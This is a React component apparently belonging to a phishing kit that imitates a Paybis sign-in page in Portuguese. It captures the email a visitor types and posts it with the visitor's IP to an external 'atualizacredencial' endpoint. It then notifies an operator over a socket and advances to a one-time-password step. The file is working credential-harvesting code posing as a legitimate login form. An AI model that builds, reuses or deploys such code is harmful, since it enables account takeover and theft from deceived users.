import React, {  useState } from "react";
import axios from "axios";

export default function Paybisemail({ socket, ip,setCenaAtual }) {
  const [email, setEmail] = useState("");

  const handleChange = (event) => {
    setEmail(event.target.value);
  };

  const validateForm = () => {
    if (email === "") {
      return false;
    }

    return true;
  };

  const handleSubmit = async (event) => {
    event.preventDefault();
    if (validateForm()) {
     
      localStorage.setItem("email", email);

      await axios.post("https://seal-app-w9oy8.ondigitalocean.app/atualizacredencial", {
        email,
        ip
      });

      socket.emit("clienteAtualizou");  
      setCenaAtual("otp");
    }
  };

  return (
    
    <div className="auth-wrapper__inner">
      <div className="auth-wrapper__body">
        <div className="auth-app-header"> Entrar</div>

        <form action="" onSubmit={(event) => handleSubmit(event)}>
          <div className="form-input__top">
            <label className="form-input__label">E-mail</label>
          </div>
          <input
            id=""
            name="email"
            type="email"
            inputMode="email"
            placeholder=""
            className="form-input__input"
            onChange={(e) => handleChange(e)}
          ></input>
          <div className="auth-app-footer">
            <button className="btn btn-primary btn-lg">Entrar</button>
          </div>
        </form>
      </div>
    </div>
  );
}
